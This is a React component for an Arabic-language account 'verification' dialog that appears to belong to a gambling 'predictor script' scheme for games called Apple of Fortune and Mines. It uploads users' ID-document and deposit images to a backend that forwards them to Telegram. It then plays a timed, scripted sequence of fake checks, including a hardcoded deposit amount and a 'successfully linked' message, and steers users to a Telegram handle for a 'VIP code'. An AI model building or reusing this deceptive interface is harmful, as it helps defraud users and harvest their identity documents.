import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { CheckCircle, Loader2, Sparkles, Send, ShieldCheck, ExternalLink, X, Copy, Check } from 'lucide-react';
import confetti from 'canvas-confetti';

interface VerificationDialogProps {
  isOpen: boolean;
  onClose: () => void;
  userId: string;
  telegramUser: string;
  selectedGame: string;
  depositImage?: string | null;
  idImage?: string | null;
}

type DialogStep = 'verifying' | 'completed';

export const VerificationDialog: React.FC<VerificationDialogProps> = ({
  isOpen,
  onClose,
  userId,
  telegramUser,
  selectedGame,
  depositImage,
  idImage
}) => {
  const [currentStep, setCurrentStep] = useState<DialogStep>('verifying');
  const [visibleLines, setVisibleLines] = useState<number>(0);
  const [copiedTg, setCopiedTg] = useState(false);
  const [isTelegramSent, setIsTelegramSent] = useState<boolean | null>(null);

  // Exact step timings as requested:
  // [Wait 1s] جار التحقق من id حسابك...
  // [Wait 1s] جار التحقق من الايداع...
  // [Wait 1.5s] جار ربط حسابك بالاسكربت...
  // [Wait 0.5s] تم ربط حسابك بنجاح ✅
  // Immediately after, transition to Part B (Telegram Direct)

  useEffect(() => {
    if (!isOpen) {
      setCurrentStep('verifying');
      setVisibleLines(0);
      setIsTelegramSent(null);
      return;
    }

    // Reset
    setCurrentStep('verifying');
    setVisibleLines(0);
    setIsTelegramSent(null);

    // Send payload to backend Telegram API
    const sendToTelegram = async () => {
      try {
        const now = new Date();
        const formattedTime = now.toLocaleString('ar-EG', {
          dateStyle: 'full',
          timeStyle: 'medium',
        });

        const res = await fetch('/api/submit-verification', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId,
            telegramUsername: telegramUser,
            selectedGame,
            depositImage: depositImage || null,
            idImage: idImage || null,
            timestamp: formattedTime,
          }),
        });

        const data = await res.json();
        setIsTelegramSent(data.success);
      } catch (err) {
        console.error('Failed to send verification to Telegram:', err);
        setIsTelegramSent(false);
      }
    };

    sendToTelegram();

    const t1 = setTimeout(() => {
      setVisibleLines(1); // line 1: جار التحقق من id حسابك...
    }, 1000);

    const t2 = setTimeout(() => {
      setVisibleLines(2); // line 2: جار التحقق من الايداع...
    }, 2000);

    const t3 = setTimeout(() => {
      setVisibleLines(3); // line 3: جار ربط حسابك بالاسكربت...
    }, 3500);

    const t4 = setTimeout(() => {
      setVisibleLines(4); // line 4: تم ربط حسابك بنجاح ✅
      // Trigger festive confetti
      try {
        confetti({
          particleCount: 80,
          spread: 70,
          origin: { y: 0.6 },
          colors: ['#FFD700', '#F5C518', '#FFA500', '#FFFFFF']
        });
      } catch {
        // Fallback
      }
    }, 4000);

    const t5 = setTimeout(() => {
      // Part B: Telegram direct after completion
      setCurrentStep('completed');
    }, 4600);

    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
      clearTimeout(t3);
      clearTimeout(t4);
      clearTimeout(t5);
    };
  }, [isOpen, userId, telegramUser, selectedGame, depositImage, idImage]);

  const handleCopyTelegram = () => {
    navigator.clipboard.writeText('@your_telegram_username');
    setCopiedTg(true);
    setTimeout(() => setCopiedTg(false), 2000);
  };

  const handleOpenTelegram = () => {
    window.open('https://t.me/your_telegram_username', '_blank', 'noopener,noreferrer');
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 select-none">
      {/* Backdrop */}
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        onClick={onClose}
        className="fixed inset-0 bg-black/85 backdrop-blur-xl transition-all"
      />

      {/* Modal Container */}
      <motion.div
        initial={{ opacity: 0, scale: 0.9, y: 20 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        exit={{ opacity: 0, scale: 0.9, y: 20 }}
        transition={{ type: 'spring', damping: 25, stiffness: 300 }}
        className="relative w-full max-w-lg rounded-3xl bg-neutral-950/95 border-2 border-yellow-500/40 p-6 sm:p-8 shadow-[0_0_50px_rgba(255,215,0,0.25),0_25px_60px_rgba(0,0,0,0.9)] backdrop-blur-2xl z-10 overflow-hidden"
      >
        {/* Ambient Top Glow */}
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-64 h-24 bg-yellow-400/20 rounded-full blur-3xl pointer-events-none" />

        {/* Close button */}
        <button
          onClick={onClose}
          className="absolute top-4 left-4 p-2 rounded-full bg-neutral-900/80 text-neutral-400 hover:text-white hover:bg-neutral-800 transition-colors cursor-pointer"
          title="إغلاق"
        >
          <X className="w-5 h-5" />
        </button>

        <AnimatePresence mode="wait">
          {currentStep === 'verifying' ? (
            /* Part A: Sequential Verification Flow */
            <motion.div
              key="verifying"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="flex flex-col items-center text-center py-4"
            >
              {/* Animated Glowing Spinner */}
              <div className="relative mb-6">
                <div className="absolute -inset-3 rounded-full bg-yellow-400/20 blur-lg animate-pulse" />
                <div className="w-20 h-20 rounded-full border-4 border-neutral-900 border-t-[#FFD700] border-r-[#FFD700] animate-spin flex items-center justify-center shadow-[0_0_25px_rgba(255,215,0,0.4)]">
                  <div className="w-12 h-12 rounded-full bg-black flex items-center justify-center border border-yellow-500/30">
                    <Sparkles className="w-6 h-6 text-[#FFD700] animate-pulse" />
                  </div>
                </div>
              </div>

              <h3 className="text-xl sm:text-2xl font-black text-white mb-2 font-['Outfit','Cairo',sans-serif]">
                فحص ومطابقة بيانات الحساب
              </h3>
              <p className="text-xs sm:text-sm text-neutral-400 mb-6">
                يرجى الانتظار بينما يتم الربط المباشر مع خوادم السكربت...
              </p>

              {/* Sequential Lines */}
              <div className="w-full max-w-sm space-y-3 text-right">
                
                {/* Line 1 */}
                <div className={`p-3 rounded-xl border transition-all duration-500 flex items-center justify-between ${
                  visibleLines >= 1 
                    ? 'bg-neutral-900/90 border-yellow-500/40 shadow-[0_0_10px_rgba(255,215,0,0.1)]' 
                    : 'opacity-20 bg-neutral-950 border-neutral-900'
                }`}>
                  <div className="flex items-center gap-3">
                    <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold ${
                      visibleLines >= 2 ? 'bg-yellow-400 text-black' : 'bg-neutral-800 text-yellow-400'
                    }`}>
                      {visibleLines >= 2 ? <Check className="w-3.5 h-3.5 stroke-[3]" /> : <Loader2 className="w-3.5 h-3.5 animate-spin" />}
                    </div>
                    <span className="text-sm font-semibold text-white">جار التحقق من id حسابك...</span>
                  </div>
                  {userId && visibleLines >= 1 && (
                    <span className="text-xs font-mono text-yellow-400 px-2 py-0.5 rounded bg-yellow-400/10 border border-yellow-400/20">
                      ID: {userId}
                    </span>
                  )}
                </div>

                {/* Line 2 */}
                <div className={`p-3 rounded-xl border transition-all duration-500 flex items-center justify-between ${
                  visibleLines >= 2 
                    ? 'bg-neutral-900/90 border-yellow-500/40 shadow-[0_0_10px_rgba(255,215,0,0.1)]' 
                    : 'opacity-20 bg-neutral-950 border-neutral-900'
                }`}>
                  <div className="flex items-center gap-3">
                    <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold ${
                      visibleLines >= 3 ? 'bg-yellow-400 text-black' : 'bg-neutral-800 text-yellow-400'
                    }`}>
                      {visibleLines >= 3 ? <Check className="w-3.5 h-3.5 stroke-[3]" /> : visibleLines >= 2 ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : '2'}
                    </div>
                    <span className="text-sm font-semibold text-white">جار التحقق من الايداع...</span>
                  </div>
                  {visibleLines >= 2 && (
                    <span className="text-[11px] text-emerald-400 font-bold">1500+ د.ع</span>
                  )}
                </div>

                {/* Line 3 */}
                <div className={`p-3 rounded-xl border transition-all duration-500 flex items-center justify-between ${
                  visibleLines >= 3 
                    ? 'bg-neutral-900/90 border-yellow-500/40 shadow-[0_0_10px_rgba(255,215,0,0.1)]' 
                    : 'opacity-20 bg-neutral-950 border-neutral-900'
                }`}>
                  <div className="flex items-center gap-3">
                    <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold ${
                      visibleLines >= 4 ? 'bg-yellow-400 text-black' : 'bg-neutral-800 text-yellow-400'
                    }`}>
                      {visibleLines >= 4 ? <Check className="w-3.5 h-3.5 stroke-[3]" /> : visibleLines >= 3 ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : '3'}
                    </div>
                    <span className="text-sm font-semibold text-white">جار ربط حسابك بالاسكربت...</span>
                  </div>
                  {visibleLines >= 3 && (
                    <span className="text-[11px] text-yellow-400 font-bold">{selectedGame === 'apple' ? 'Apple of Fortune' : 'Gams Mines'}</span>
                  )}
                </div>

                {/* Line 4 */}
                <div className={`p-3.5 rounded-xl border transition-all duration-500 flex items-center justify-between ${
                  visibleLines >= 4 
                    ? 'bg-emerald-950/40 border-emerald-500/50 shadow-[0_0_20px_rgba(16,185,129,0.2)]' 
                    : 'opacity-20 bg-neutral-950 border-neutral-900'
                }`}>
                  <div className="flex items-center gap-3">
                    <div className="w-6 h-6 rounded-full bg-emerald-400 text-black flex items-center justify-center text-xs font-bold">
                      <Check className="w-4 h-4 stroke-[3]" />
                    </div>
                    <span className="text-sm font-black text-emerald-300">تم ربط حسابك بنجاح ✅</span>
                  </div>
                </div>

              </div>
            </motion.div>
          ) : (
            /* Part B: Telegram Direct Screen */
            <motion.div
              key="completed"
              initial={{ opacity: 0, scale: 0.92 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.92 }}
              className="flex flex-col items-center text-center py-4"
            >
              {/* Large Telegram Glowing Icon */}
              <div className="relative mb-5">
                <div className="absolute -inset-4 rounded-full bg-yellow-400/25 blur-2xl animate-pulse" />
                
                <div className="relative w-24 h-24 sm:w-28 sm:h-28 rounded-full bg-gradient-to-tr from-yellow-500 via-amber-400 to-[#FFD700] p-1 shadow-[0_0_35px_rgba(255,215,0,0.5)] flex items-center justify-center">
                  <div className="w-full h-full bg-black rounded-full flex items-center justify-center border-2 border-yellow-400/80">
                    <Send className="w-12 h-12 sm:w-14 sm:h-14 text-[#FFD700] -rotate-12 translate-x-1" />
                  </div>
                </div>
              </div>

              {/* Status Header */}
              <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold mb-3">
                <ShieldCheck className="w-4 h-4" />
                <span>تم إتمام وتأكيد الربط بنجاح</span>
              </div>

              {/* Text: يوزر الدعم الفني / المطور */}
              <h3 className="text-2xl sm:text-3xl font-black text-white tracking-wide mb-1 font-['Outfit','Cairo',sans-serif]">
                يوزر الدعم الفني / المطور
              </h3>
              
              <p className="text-xs sm:text-sm text-neutral-300 max-w-sm mb-5 leading-relaxed">
                اضغط على الزر بالأسفل للانتقال الفوري إلى حساب المطور على تيليجرام لاستلام <span className="text-[#FFD700] font-bold">كود التفعيل VIP</span> وبدء تشغيل السكربت فوراً.
              </p>

              {/* Developer Handle Card */}
              <div className="w-full max-w-xs p-3.5 mb-6 rounded-2xl bg-neutral-900/90 border border-yellow-500/40 flex items-center justify-between shadow-inner">
                <div className="flex items-center gap-2.5">
                  <div className="w-8 h-8 rounded-full bg-yellow-400/15 border border-yellow-400/30 flex items-center justify-center">
                    <Send className="w-4 h-4 text-yellow-400" />
                  </div>
                  <div className="text-right">
                    <div className="text-[10px] text-neutral-400 font-semibold">المطور الرسمي</div>
                    <div className="text-xs font-bold text-[#FFD700] font-mono" dir="ltr">@your_telegram_username</div>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={handleCopyTelegram}
                  className="px-2.5 py-1 rounded-lg bg-neutral-800 hover:bg-neutral-700 text-neutral-300 hover:text-white text-xs font-semibold flex items-center gap-1 border border-neutral-700 transition-all cursor-pointer"
                  title="نسخ اليوزر"
                >
                  {copiedTg ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>{copiedTg ? 'تم!' : 'نسخ'}</span>
                </button>
              </div>

              {/* Button: "التوجهه الي اليوزر" -> opens https://t.me/your_telegram_username */}
              <button
                type="button"
                onClick={handleOpenTelegram}
                className="relative w-full max-w-xs h-14 rounded-2xl bg-gradient-to-r from-amber-400 via-[#FFD700] to-yellow-300 text-black font-black text-base sm:text-lg tracking-wide shadow-[0_0_25px_rgba(255,215,0,0.5)] hover:shadow-[0_0_40px_rgba(255,215,0,0.8)] hover:scale-[1.02] active:scale-[0.98] transition-all duration-300 flex items-center justify-center gap-3 cursor-pointer group overflow-hidden"
              >
                {/* Light reflection effect */}
                <div className="absolute inset-0 -translate-x-full group-hover:translate-x-full transition-transform duration-1000 bg-gradient-to-r from-transparent via-white/30 to-transparent pointer-events-none" />
                
                <Send className="w-5 h-5 text-black -rotate-12 group-hover:translate-x-1 transition-transform" />
                <span>التوجهه الي اليوزر</span>
                <ExternalLink className="w-4 h-4 text-black opacity-80" />
              </button>

              <p className="mt-4 text-[11px] text-neutral-500">
                متاح 24/7 للرد الفوري وتفعيل الأكواد
              </p>
            </motion.div>
          )}
        </AnimatePresence>

      </motion.div>
    </div>
  );
};
